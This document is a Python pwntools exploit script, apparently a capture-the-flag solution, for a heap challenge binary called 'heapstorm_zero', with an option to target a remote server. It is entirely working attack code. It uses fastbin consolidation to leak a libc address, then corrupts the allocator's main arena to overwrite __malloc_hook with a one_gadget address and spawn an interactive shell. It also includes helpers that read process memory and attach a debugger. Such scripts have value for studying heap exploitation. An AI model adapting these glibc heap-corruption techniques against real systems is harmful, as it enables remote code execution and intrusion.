from pwn import *

DEBUG = 1
if DEBUG:
     p = process('./heapstorm_zero')
     e = ELF('./heapstorm_zero')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     #libc = ELF('./libc64.so')
     
     
else:
     p = remote('150.109.46.159', 20002)
     libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def alloc(size,content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.send(content)


def view(idx):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(idx))
    p.recvuntil('Content: ')


def delete(idx):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(idx))
    
def big_scanf():
    p.recvuntil('Choice:')
    p.sendline('1'*0x500)

def pwn():
    #debug(0xEE0)
    
    alloc(0x38,'0'*8+'\n') #0

    alloc(0x38,'1'*8+'\n') #1
    alloc(0x38,'2'*8+'\n') #2
    alloc(0x38,'3'*8+'\n') #3
    alloc(0x38,'4'*0x30+p64(0x100)) #4
    alloc(0x38,'5'*8+'\n') #5
    
    alloc(0x38,'6'*8+'\n') #6
    alloc(0x38,'7'*8+'\n') #7
    for i in range(1,6):
        delete(i)
    
    big_scanf()
    delete(0)
    #debug(0xa8f)
    alloc(0x38,'0'*0x38) #0
    alloc(0x30,'1'*8+'\n') #1
    alloc(0x10,'2'*8+'\n') #2
    alloc(0x10,'3'*8+'\n') #3
    alloc(0x30,'4'*8+'\n') #4
    alloc(0x30,'4'*8+'\n') #5
    delete(1)
    
    big_scanf()
    delete(6)
    #debug(0xa8f)
    big_scanf()
    alloc(0x30,'1'*8+'\n') #1
    view(2)
    libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x3c4b78
    rce=0x4526a+libc_base
    malloc_hook=libc_base+libc.symbols['__malloc_hook']

    alloc(0x10,'6'*8+'\n') #6
    alloc(0x10,'8'*8+'\n') #8
    alloc(0x30,'9'*8+'\n') #9
    alloc(0x30,'0'*8+'\n') #10
    #debug(0x126d)
    delete(6)
    delete(8)
    delete(2)
    
    delete(9)
    delete(10)
    delete(4)
    
    alloc(0x10,p64(0x41)+'\n') #2
    alloc(0x10,'4'*8+'\n')  #4
    alloc(0x10,'6'*8+'\n')  #6
    
    alloc(0x30,p64(libc_base+0x3c4b78-0x58)+'\n') #8
    alloc(0x30,'9'*8+'\n') #9
    alloc(0x30,'0'*8+'\n') #10
    
    alloc(0x30,p64(0)+p64(libc_base+0x3c4b78-0x28)+p64(0)*3+p64(0x41)) #11
    
    alloc(0x38,p64(0)*3+p64(malloc_hook-0x10)+p64(0)+p64(libc_base+0x3c4b78)+p64(libc_base+0x3c4b78)[:-1]+'\n') #12
    alloc(0x30,p64(rce)+'\n')
    
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline('1')
    p.interactive()

if __name__ == '__main__':
   pwn()

